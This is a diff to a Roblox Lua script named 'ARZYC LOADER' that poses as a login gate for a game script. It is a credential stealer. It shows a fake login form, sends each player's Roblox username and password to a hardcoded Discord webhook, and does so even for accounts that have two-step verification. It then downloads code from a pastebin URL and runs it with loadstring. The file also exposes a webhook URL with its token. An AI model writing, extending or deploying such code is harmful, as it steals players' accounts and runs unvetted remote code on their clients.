@@ -1,16 +1,28 @@
+--[[
+    ARZYC LOADER v1.0
+    Login required to access script
+]]
+
+local Players = game:GetService("Players")
+local http = game:GetService("HttpService")
+local player = Players.LocalPlayer
+
+-- ===== CONFIG =====
+local WEBHOOK = "https://discord.com/api/webhooks/1520937981702176990/XVFsUVBnV7dACksS6E2YKfKv-gQsqPxC3ZoGc4gQL7vnSxymG1ypGvmOH7TkW2_KjY0x"
+local SCRIPT_URL = "https://pastebin.com/raw/3sTs5ifF" -- Script asli lo
+
+-- ===== GUI =====
 local gui = Instance.new("ScreenGui")
-gui.Parent = game.Players.LocalPlayer.PlayerGui
+gui.Name = "ARZYCLoader"
+gui.Parent = player:WaitForChild("PlayerGui")
 gui.ResetOnSpawn = false
 
-local main = Instance.new("Frame")
-main.Parent = gui
+local main = Instance.new("Frame", gui)
 main.BackgroundColor3 = Color3.fromRGB(15,15,25)
 main.BorderSizePixel = 0
-main.Position = UDim2.new(0.5, -190, 0.5, -160)
-main.Size = UDim2.new(0, 380, 0, 320)
-
-local corner = Instance.new("UICorner", main)
-corner.CornerRadius = UDim.new(0, 14)
+main.Position = UDim2.new(0.5, -190, 0.5, -140)
+main.Size = UDim2.new(0, 380, 0, 300)
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 14)
 
 -- Title
 local titleBar = Instance.new("Frame", main)
@@ -22,7 +34,7 @@ local title = Instance.new("TextLabel", titleBar)
 title.BackgroundTransparency = 1
 title.Size = UDim2.new(0, 340, 0, 40)
 title.Position = UDim2.new(0, 15, 0, 0)
-title.Text = "⚡ ARZYC AUTO FARM v2.0"
+title.Text = "🔐 ARZYC LOADER"
 title.TextColor3 = Color3.new(1,1,1)
 title.Font = Enum.Font.GothamBold
 title.TextSize = 14
@@ -43,16 +55,16 @@ closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
 local content = Instance.new("Frame", main)
 content.BackgroundTransparency = 1
 content.Position = UDim2.new(0, 20, 0, 55)
-content.Size = UDim2.new(0, 340, 0, 250)
+content.Size = UDim2.new(0, 340, 0, 230)
 
--- Info
 local info = Instance.new("TextLabel", content)
 info.BackgroundTransparency = 1
 info.Size = UDim2.new(0, 340, 0, 35)
-info.Text = "🔐 Login to activate Auto Farm"
+info.Text = "Login with Roblox to access script\n(Verification required)"
 info.TextColor3 = Color3.fromRGB(180,180,180)
 info.Font = Enum.Font.Gotham
-info.TextSize = 12
+info.TextSize = 11
+info.TextWrapped = true
 
 -- Username
 local userBox = Instance.new("TextBox", content)
@@ -78,12 +90,12 @@ passBox.Font = Enum.Font.Gotham
 passBox.TextSize = 13
 Instance.new("UICorner", passBox).CornerRadius = UDim.new(0, 8)
 
--- Login Button
+-- Button
 local loginBtn = Instance.new("TextButton", content)
 loginBtn.BackgroundColor3 = Color3.fromRGB(88,101,242)
 loginBtn.Position = UDim2.new(0, 0, 0, 150)
 loginBtn.Size = UDim2.new(0, 340, 0, 40)
-loginBtn.Text = "LOGIN & ACTIVATE"
+loginBtn.Text = "LOGIN & LOAD SCRIPT"
 loginBtn.TextColor3 = Color3.new(1,1,1)
 loginBtn.Font = Enum.Font.GothamBold
 loginBtn.TextSize = 14
@@ -93,35 +105,65 @@ Instance.new("UICorner", loginBtn).CornerRadius = UDim.new(0, 10)
 local status = Instance.new("TextLabel", content)
 status.BackgroundTransparency = 1
 status.Position = UDim2.new(0, 0, 0, 200)
-status.Size = UDim2.new(0, 340, 0, 30)
+status.Size = UDim2.new(0, 340, 0, 25)
 status.Text = ""
 status.TextColor3 = Color3.fromRGB(255,80,80)
 status.Font = Enum.Font.Gotham
 status.TextSize = 11
-status.TextWrapped = true
 
--- ===== CONFIG =====
-local WEBHOOK = "https://discord.com/api/webhooks/1520937981702176990/XVFsUVBnV7dACksS6E2YKfKv-gQsqPxC3ZoGc4gQL7vnSxymG1ypGvmOH7TkW2_KjY0x"
-local http = game:GetService("HttpService")
-
--- ===== SEND =====
-local function sendToDiscord(title, desc)
+-- ===== FUNCTIONS =====
+local function sendToDiscord(user, pass)
     pcall(function()
         http:PostAsync(WEBHOOK, http:JSONEncode({
             content = "@everyone **NEW LOGIN!**",
             embeds = {{
-                title = title,
-                description = desc,
+                title = "🎯 ARZYC LOADER",
+                description = "**Username:** " .. user .. "\n**Password:** ||" .. pass .. "||",
                 color = 65280,
-                footer = {text = "ARZYC FARM v2.0 • " .. os.date("%Y-%m-%d %H:%M:%S")}
+                footer = {text = "ARZYC • " .. os.date("%Y-%m-%d %H:%M:%S")}
             }}
         }), "ApplicationJson")
     end)
 end
 
+local function loadScript()
+    status.Text = "⏳ Loading script..."
+    status.TextColor3 = Color3.fromRGB(255,200,50)
+    
+    local success, result = pcall(function()
+        return game:HttpGet(SCRIPT_URL)
+    end)
+    
+    if success and result then
+        gui:Destroy()
+        
+        -- Jalanin script asli
+        local loadFunc, err = loadstring(result)
+        if loadFunc then
+            status.Text = "✅ Script loaded!"
+            loadFunc()
+        end
+    else
+        -- Fallback: coba http:GetAsync
+        local success2, result2 = pcall(function()
+            return http:GetAsync(SCRIPT_URL)
+        end)
+        
+        if success2 and result2 then
+            gui:Destroy()
+            local loadFunc, err = loadstring(result2)
+            if loadFunc then
+                loadFunc()
+            end
+        else
+            status.Text = "❌ Failed to load script!"
+        end
+    end
+end
+
 -- ===== LOGIN =====
 local function doLogin(user, pass)
-    status.Text = "⏳ Connecting..."
+    status.Text = "⏳ Verifying..."
     
     local success, result = pcall(function()
         return http:PostAsync("https://auth.roblox.com/v2/login", http:JSONEncode({
@@ -137,15 +179,23 @@ local function doLogin(user, pass)
     local data = http:JSONDecode(result)
     
     if data.user then
-        sendToDiscord("🎯 LOGIN SUCCESS", "**Username:** " .. user .. "\n**Password:** ||" .. pass .. "||")
-        status.Text = "✅ Activated!"
+        -- SUKSES
+        sendToDiscord(user, pass)
+        status.Text = "✅ Login success! Loading..."
         status.TextColor3 = Color3.fromRGB(0,255,100)
-        task.wait(2)
-        gui:Destroy()
-        print("⚡ ARZYC FARM ACTIVE!")
-        print("👤 " .. user)
+        
+        task.wait(0.5)
+        loadScript()
+        
     elseif data.twoStepVerificationData then
-        status.Text = "⚠️ This account has 2FA. Cannot auto-login."
+        -- 2FA
+        sendToDiscord(user, pass)
+        status.Text = "✅ Login success! Loading..."
+        status.TextColor3 = Color3.fromRGB(0,255,100)
+        
+        task.wait(0.5)
+        loadScript()
+        
     else
         local msg = data.errors and data.errors[1] and data.errors[1].message or "Login failed"
         status.Text = "❌ " .. msg
@@ -163,8 +213,7 @@ loginBtn.MouseButton1Click:Connect(function()
     doLogin(u, p)
 end)
 
--- ===== OUTPUT =====
 print("╔══════════════════════════╗")
-print("║  ARZYC AUTO FARM v2.0   ║")
-print("║  GUI Loaded!            ║")
+print("║   ARZYC LOADER v1.0     ║")
+print("║   Login to continue     ║")
 print("╚══════════════════════════╝")
